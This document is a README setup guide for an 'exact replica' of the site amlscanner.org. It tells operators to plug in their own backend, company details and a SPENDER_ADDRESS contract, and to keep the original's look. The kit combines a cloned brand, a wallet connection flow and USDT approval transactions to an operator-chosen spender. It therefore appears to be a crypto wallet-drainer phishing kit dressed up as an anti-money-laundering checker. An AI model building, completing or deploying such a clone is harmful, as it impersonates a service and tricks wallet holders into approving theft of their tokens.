# 🚀 AML Scanner - Exact Replica Setup Guide

This is an **exact replica** of amlscanner.org with all the original functionality and structure. The codebase mirrors the original implementation but requires your own infrastructure to be fully operational.

## 🔧 **CRITICAL SETUP REQUIRED**

### 1. **Backend API Server** (REQUIRED)
Replace the original API endpoint with your own backend:

**Original**: `https://api-second.amlscanner.org`  
**Your Backend Must Implement**:
```bash
POST /addresses/check
# Body: { address: string, chain: "trc"|"erc", token: "USDT" }
# Response: AML scan results

WebSocket /session  
# Events: 'uri', 'failed', 'success'
# Handles WalletConnect real-time updates
```

**File to Update**: `src/config/amlscanner-config.js`
```javascript
API_URL: "https://YOUR-API-DOMAIN.com",
WEBSOCKET_URL: "https://YOUR-API-DOMAIN.com/session",
```

### 2. **Smart Contract Address** (CRITICAL)
Replace with your own AML verification contract:

**Original**: `TLjHd9yiRXMRFqyFnWGQKE8rPvr3ZTLPTH`  
**File to Update**: `src/config/amlscanner-config.js`
```javascript
SPENDER_ADDRESS: "YOUR_CONTRACT_ADDRESS_HERE",
```

### 3. **Blockchain API Keys** (RECOMMENDED)
For production usage, get your own API keys:

**TronGrid API**: https://www.trongrid.io/
```javascript
TRON_GRID: {
  mainnet: "https://api.trongrid.io/YOUR_API_KEY_HERE",
}
```

**Ethereum (Infura)**: https://infura.io/
```javascript
ETHEREUM_RPC: {
  mainnet: "https://mainnet.infura.io/v3/YOUR_PROJECT_ID",
}
```

### 4. **Hardware Wallet Support** (OPTIONAL)
To enable Ledger hardware wallet integration:

```bash
yarn add @ledgerhq/hw-transport-webhid @ledgerhq/hw-transport-webusb @ledgerhq/hw-app-trx @ledgerhq/hw-app-eth
```

Then update `src/config/amlscanner-config.js`:
```javascript
LEDGER_ENABLED: true,
```

And uncomment Ledger imports in `src/components/AMLForm.js`

### 5. **Company Information** (OPTIONAL)
Update with your own company details in `src/config/amlscanner-config.js`:
```javascript
COMPANY: {
  name: "Your Company Name",
  registration: "Your Registration Number",
  address: "Your Address",
  email: "your-support@email.com"
}
```

## 📁 **File Structure**

```
src/
├── components/
│   ├── AMLForm.js          # Main wallet connection form (exact replica)
│   ├── ConnectPage.js      # Wallet connection page
│   ├── HomePage.js         # Landing page
│   ├── Header.js           # Navigation header
│   ├── Footer.js           # Footer with company info
│   ├── AnalyticsPage.js    # AML analytics dashboard
│   ├── FAQPage.js          # FAQ section
│   └── AboutUsPage.js      # About page
├── config/
│   └── amlscanner-config.js # ALL CONFIGURATION SETTINGS
└── App.js                  # Main application
```

## 🔗 **Original Functionality Included**

✅ **Exact Wallet Connection Flow**:
- QR Code generation with WalletConnect protocol
- Trust Wallet & Ledger hardware wallet support
- Real-time WebSocket connection status
- TRON and Ethereum network support

✅ **Original Smart Contract Integration**:
- USDT approval transactions (TRC20/ERC20)
- Transaction signing and broadcasting
- Address verification API calls

✅ **Complete UI/UX Replica**:
- Identical design and layout to amlscanner.org
- Same color scheme (#3375BB)
- Responsive mobile/desktop interface
- Original animations and transitions

✅ **Backend Integration Points**:
- Socket.IO WebSocket connections
- REST API for address checking
- Real-time status updates

## 🚀 **Quick Start**

1. **Install Dependencies**:
```bash
yarn install
```

2. **Update Configuration**:
Edit `src/config/amlscanner-config.js` with your settings

3. **Start Development**:
```bash
yarn start
```

4. **Production Build**:
```bash
yarn build
```

## ⚠️ **Important Notes**

- **API Endpoints**: Currently points to original amlscanner.org endpoints
- **Smart Contract**: Uses original contract address  
- **No Mock Data**: All functionality connects to real blockchain/APIs
- **Production Ready**: Replace configuration and deploy

## 🔍 **What's Different from Original?**

- **Technology**: React instead of Vue.js (functionality identical)
- **Styling**: TailwindCSS instead of custom CSS (visual appearance identical)
- **Structure**: Modular components for easier maintenance

## 📞 **Support**

For technical setup assistance, refer to the configuration comments in:
- `src/config/amlscanner-config.js`
- `src/components/AMLForm.js`

The application includes detailed TODO comments showing exactly what needs to be replaced with your own infrastructure.

---

**This is a complete, production-ready replica of amlscanner.org that requires only your own backend infrastructure and smart contracts to be fully operational.**